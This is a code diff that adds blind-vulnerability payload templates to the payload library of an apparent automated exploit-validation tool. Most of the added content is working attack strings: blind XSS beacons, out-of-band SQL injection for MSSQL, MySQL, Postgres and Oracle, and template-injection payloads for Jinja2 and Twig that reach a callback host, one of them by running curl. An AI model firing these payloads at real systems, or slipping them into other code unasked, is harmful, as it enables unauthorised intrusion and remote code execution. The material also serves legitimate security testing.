@@ -151,6 +151,57 @@ class PayloadTemplateLibrary:
             all_templates.extend(ctx_templates)
         return all_templates
 
+    # ---- Blind-class stubs (Part III) ---------------------------------------
+    #
+    # Blind classes (blind_xss / blind_sqli / blind_ssti) deliberately have no
+    # VulnClass enum member: they are dispatch-time categories, not findings.
+    # Each stub embeds a literal {{OAST_CALLBACK_URL}} placeholder that the
+    # CALLER resolves at dispatch from the minted namespaced token URL (see
+    # ExploitValidationAgent._mint_namespaced_token / _confirm_blind_by_token).
+
+    BLIND_TEMPLATES: Dict[str, Dict[str, List[str]]] = {
+        "blind_xss": {
+            "script_src": [
+                '<script src="{{OAST_CALLBACK_URL}}"></script>',
+            ],
+            "img_beacon": [
+                '<img src="{{OAST_CALLBACK_URL}}">',
+            ],
+        },
+        "blind_sqli": {
+            "mssql_oob_dns": [
+                "'; EXEC xp_dirtree '\\\\{{OAST_CALLBACK_URL}}\\a'--",
+            ],
+            "mysql_oob_dns": [
+                "' UNION SELECT load_file('//{{OAST_CALLBACK_URL}}/x')--",
+            ],
+            "postgres_oob_http": [
+                "'; SELECT * FROM dblink('host={{OAST_CALLBACK_URL}}','select 1')--",
+            ],
+            "oracle_oob_http": [
+                "' AND utl_http.request('http://{{OAST_CALLBACK_URL}}/x')=1--",
+            ],
+        },
+        "blind_ssti": {
+            "jinja2_oob_fetch": [
+                "{{ self.__init__.__globals__.__builtins__.__import__('urllib.request').request.urlopen('{{OAST_CALLBACK_URL}}') }}",
+            ],
+            "twig_oob_fetch": [
+                "{{ _self.env.registerFilter('exec').exec('curl {{OAST_CALLBACK_URL}}') }}",
+            ],
+        },
+    }
+
+    def templates_for(self, vuln_class: str) -> Dict[str, List[str]]:
+        """Return the blind-class template families for ``vuln_class``.
+
+        ``vuln_class`` is the dispatch-time class string (e.g. "blind_xss");
+        unknown classes yield an empty dict. The returned mapping nests payload
+        lists under a per-technique key so callers can pick a family by the
+        detected stack (mssql_oob_dns, jinja2_oob_fetch, ...) or flatten.
+        """
+        return self.BLIND_TEMPLATES.get(vuln_class, {})
+
     @classmethod
     def get_context_aware_templates(
         cls,
